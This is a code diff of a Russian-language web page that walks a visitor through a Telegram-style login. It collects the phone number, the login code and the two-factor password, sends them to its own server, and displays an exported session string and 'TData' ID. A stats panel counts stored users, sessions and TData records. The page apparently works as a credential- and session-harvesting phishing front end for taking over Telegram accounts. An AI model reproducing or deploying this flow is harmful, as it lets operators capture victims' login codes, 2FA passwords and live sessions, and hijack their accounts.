@@ -154,6 +154,12 @@
         .step {
             display: none;
             width: 100%;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         .step.active {
@@ -186,11 +192,13 @@
             border-radius: 10px;
             color: white;
             font-size: 1rem;
+            transition: all 0.3s ease;
         }
 
         .input-group input:focus {
             outline: none;
             border-color: #0088cc;
+            box-shadow: 0 0 15px rgba(0, 136, 204, 0.3);
         }
 
         .btn {
@@ -201,12 +209,109 @@
             font-size: 1rem;
             border-radius: 25px;
             cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.4);
             width: 100%;
             margin-top: 10px;
         }
 
         .btn:hover {
             transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.6);
+        }
+
+        .btn:disabled {
+            background: rgba(255, 255, 255, 0.2);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .alert {
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 10px;
+            text-align: left;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .success {
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid rgba(76, 175, 80, 0.5);
+            color: #a5d6a7;
+        }
+
+        .error {
+            background: rgba(244, 67, 54, 0.2);
+            border: 1px solid rgba(244, 67, 54, 0.5);
+            color: #ef9a9a;
+        }
+
+        .info {
+            background: rgba(33, 150, 243, 0.2);
+            border: 1px solid rgba(33, 150, 243, 0.5);
+            color: #90caf9;
+        }
+
+        .warning {
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid rgba(255, 193, 7, 0.5);
+            color: #fff59d;
+        }
+
+        .user-info {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .user-info h4 {
+            color: #ff6bff;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .user-info p {
+            margin: 8px 0;
+            color: #e0c3ff;
+        }
+
+        .stats {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .stats h4 {
+            color: #ff6bff;
+            margin-bottom: 15px;
+        }
+
+        .back-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .back-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
         }
 
         .welcome-text {
@@ -254,7 +359,6 @@
                 </button>
             </div>
 
-            <!-- Остальные шаги остаются без изменений -->
             <div id="step1" class="step">
                 <h3>📱 Введите номер телефона</h3>
                 <div class="input-group">
@@ -305,34 +409,246 @@
 
             <div id="results"></div>
         </div>
+
+        <div class="stats" id="statsSection">
+            <h4>📊 Статистика системы</h4>
+            <p>Загрузка...</p>
+        </div>
     </div>
 
     <script>
-        // Простой JavaScript код
+        // Создание звездного фона
         function createStars() {
             const stars = document.getElementById('stars');
-            for (let i = 0; i < 100; i++) {
+            const starsCount = 150;
+            
+            for (let i = 0; i < starsCount; i++) {
                 const star = document.createElement('div');
                 star.className = 'star';
+                
+                const size = Math.random() * 2 + 1;
+                star.style.width = size + 'px';
+                star.style.height = size + 'px';
+                
                 star.style.left = Math.random() * 100 + '%';
                 star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 5 + 's';
+                
                 stars.appendChild(star);
             }
         }
 
+        let currentSessionId = '';
+        let currentPhone = '';
+
+        // Показать определенный шаг
         function showStep(stepId) {
             document.querySelectorAll('.step').forEach(step => {
                 step.classList.remove('active');
             });
             document.getElementById(stepId).classList.add('active');
+            document.getElementById('results').innerHTML = '';
         }
 
+        // Начать авторизацию
         function startAuth() {
             showStep('step1');
+            loadStats();
         }
 
-        // Остальной JavaScript код из предыдущих версий
-        // ... (можно добавить позже)
+        // Показать уведомление
+        function showAlert(message, type) {
+            const results = document.getElementById('results');
+            results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
+        }
+
+        // Показать информацию о пользователе
+        function showUserInfo(userInfo, exportInfo) {
+            const results = document.getElementById('results');
+            results.innerHTML = `
+                <div class="user-info">
+                    <h4>✅ Успешная авторизация!</h4>
+                    <p><strong>👤 Имя:</strong> ${userInfo.first_name || 'Не указано'}</p>
+                    <p><strong>👥 Фамилия:</strong> ${userInfo.last_name || 'Не указана'}</p>
+                    <p><strong>🔗 Username:</strong> @${userInfo.username || 'Не указан'}</p>
+                    <p><strong>🆔 ID:</strong> ${userInfo.id}</p>
+                    <p><strong>📞 Телефон:</strong> ${userInfo.phone_number}</p>
+                    <p><strong>🔐 Session String:</strong> ${exportInfo.session_string ? exportInfo.session_string.substring(0, 50) + '...' : 'Не доступен'}</p>
+                    <p><strong>💾 TData ID:</strong> ${exportInfo.tdata_id || 'Не доступен'}</p>
+                </div>
+                <button class="btn" onclick="location.reload()">
+                    <div class="btn-content">
+                        <span>🔄 Новая авторизация</span>
+                    </div>
+                </button>
+            `;
+        }
+
+        // Загрузка статистики
+        async function loadStats() {
+            try {
+                const response = await fetch('/api/storage/stats');
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.success) {
+                        const stats = data.statistics;
+                        document.getElementById('statsSection').innerHTML = `
+                            <h4>📊 Статистика системы</h4>
+                            <p>👥 Пользователей: ${stats.total_users}</p>
+                            <p>💾 Сессий: ${stats.active_sessions}</p>
+                            <p>🗂️ TData записей: ${stats.total_tdata_records}</p>
+                        `;
+                    }
+                }
+            } catch (error) {
+                console.error('Ошибка загрузки статистики:', error);
+            }
+        }
+
+        // Запрос кода
+        async function requestCode() {
+            const phone = document.getElementById('phone').value.trim();
+            currentPhone = phone;
+
+            if (!phone) {
+                showAlert('Введите номер телефона', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('requestBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="btn-content"><div class="telegram-logo"></div><span>📡 Отправка...</span></div>';
+
+            try {
+                const response = await fetch('/api/auth/request-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phone})
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    currentSessionId = data.session_id;
+                    showStep('step2');
+                    showAlert('✅ Код отправлен в Telegram! Проверьте приложение и введите код.', 'success');
+                    document.getElementById('code').focus();
+                } else {
+                    showAlert('❌ ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('❌ Ошибка сети: ' + error.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<div class="btn-content"><div class="telegram-logo"></div><span>Получить код</span></div>';
+            }
+        }
+
+        // Верификация кода
+        async function verifyCode() {
+            const code = document.getElementById('code').value.trim();
+
+            if (!code || code.length !== 5) {
+                showAlert('Введите 5-значный код из Telegram', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('verifyBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="btn-content"><div class="telegram-logo"></div><span>🔍 Проверка...</span></div>';
+
+            try {
+                const response = await fetch('/api/auth/verify-code', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: currentSessionId,
+                        code: code
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    if (data.needs_password) {
+                        showStep('step3');
+                        showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
+                        document.getElementById('password').focus();
+                    } else {
+                        showUserInfo(data.user_info, data.export_info);
+                        loadStats();
+                    }
+                } else {
+                    showAlert('❌ ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('❌ Ошибка сети: ' + error.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<div class="btn-content"><div class="telegram-logo"></div><span>Проверить код</span></div>';
+            }
+        }
+
+        // Верификация пароля 2FA
+        async function verifyPassword() {
+            const password = document.getElementById('password').value;
+
+            if (!password) {
+                showAlert('Введите пароль 2FA', 'error');
+                return;
+            }
+
+            const btn = document.getElementById('passwordBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="btn-content"><div class="telegram-logo"></div><span>🔍 Проверка...</span></div>';
+
+            try {
+                const response = await fetch('/api/auth/verify-password', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        session_id: currentSessionId,
+                        password: password
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.success) {
+                    showUserInfo(data.user_info, data.export_info);
+                    loadStats();
+                } else {
+                    showAlert('❌ ' + data.error, 'error');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('❌ Ошибка сети: ' + error.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<div class="btn-content"><div class="telegram-logo"></div><span>Проверить пароль</span></div>';
+            }
+        }
+
+        // Обработчики Enter
+        document.getElementById('phone').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') requestCode();
+        });
+        
+        document.getElementById('code').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') verifyCode();
+        });
+
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') verifyPassword();
+        });
+
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {
+            createStars();
+            loadStats();
+        });
     </script>
 </body>
 </html>
